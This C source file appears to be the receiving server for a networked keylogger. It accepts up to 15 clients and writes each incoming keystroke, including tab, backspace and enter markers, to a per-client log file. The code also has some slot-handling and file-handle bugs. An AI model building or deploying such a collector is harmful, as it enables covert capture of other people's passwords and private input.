#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <assert.h>
#include <pthread.h>
#include <poll.h>

#define PORT 8457
#define MAX_SIZE 15

int main() {
    int server_fd;
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    assert(server_fd >= 0);

    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("Setsockopt Failure");
        exit(1);
    }

    struct sockaddr_in sockAddr;
    socklen_t addrLen = sizeof(sockAddr);
    memset(&sockAddr, 0, sizeof(sockAddr));
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_addr.s_addr = INADDR_ANY;
    sockAddr.sin_port = htons(PORT);

    // Bind the socket to the network address and port
    if (bind(server_fd, (struct sockaddr*)&sockAddr, sizeof(sockAddr)) < 0) {
        perror("Binding Failure");
        exit(1);
    }

    if (listen(server_fd, SOMAXCONN) < 0) {
        perror("Listen Failure");
        exit(1);
    }

    struct pollfd ufds[MAX_SIZE + 1];
    ufds[0].fd = server_fd;
    ufds[0].events = POLLIN;

    for (int i = 1; i < MAX_SIZE; i++) {
        ufds[i].fd = -1;
    }

    int num_clients = 0;
    
    while (1) {
        int rv = poll(ufds, num_clients + 1, -1);

        if (rv < 0){
            perror("Poll Failure");
            exit(1);
        }
        int socket;
        if (ufds[0].revents & POLLIN) {
            socket = accept(server_fd, (struct sockaddr *)&sockAddr, (socklen_t *)&addrLen);
            if (socket < 0) {
                perror("Accept Failure");
                exit(1);
            }
            if (num_clients < MAX_SIZE) {
                num_clients++;
                ufds[num_clients].fd = socket;
                ufds[num_clients].events = POLLIN;
                getpeername(socket, (struct sockaddr*) &sockAddr, &addrLen);
                printf("Connected to IP %s, Port %d\n", inet_ntoa(sockAddr.sin_addr), ntohs(sockAddr.sin_port));
            }
        }

        for (int i = 1; i <= MAX_SIZE; i++) {
            int socket = ufds[i].fd;

            if (socket != -1 && ufds[i].revents & POLLIN) {
                getpeername(socket, (struct sockaddr*) &sockAddr, &addrLen);
                char filename[INET_ADDRSTRLEN + 10];
                snprintf(filename, sizeof(filename), "%s:%d.txt", inet_ntoa(sockAddr.sin_addr), ntohs(sockAddr.sin_port));
                FILE *fp = fopen(filename, "a");
                char buffer = -1;
                int bytes = recv(socket, &buffer, 1, 0);
                if (bytes <= 0) {
                    printf("Client <%s:%d> Failure\n", inet_ntoa(sockAddr.sin_addr), ntohs(sockAddr.sin_port));
                    close(ufds[i].fd);
                    ufds[i].fd = -1;
                    num_clients--;
                } else {
                    if (buffer == -1) {
                        continue;
                    } else if (buffer == 9) {
                        printf("Writing \"TAB\" to %s\n", filename);
                        fputs("<TAB>", fp);
                    } else if (buffer == 127) {
                        printf("Writing \"BACKSPACE\" to %s\n", filename);
                        fputs("<BACKSPACE>", fp);
                    } else if (buffer == 10) {
                        printf("Writing \"ENTER\" to %s\n", filename);
                        fputs("\n", fp);
                    } else if (buffer == 32) {
                        printf("Writing \"SPACE\" to %s\n", filename);
                        fputc(buffer, fp);
                    } else if (buffer >= 33 && buffer <= 126) {
                        printf("Writing \"%c (%d)\" to %s\n", buffer, buffer, filename);
                        fputc(buffer, fp);
                    } else {
                        printf("Unrecognized!\n");
                    }
                    fclose(fp);
                }
            }
        }
        
    }


}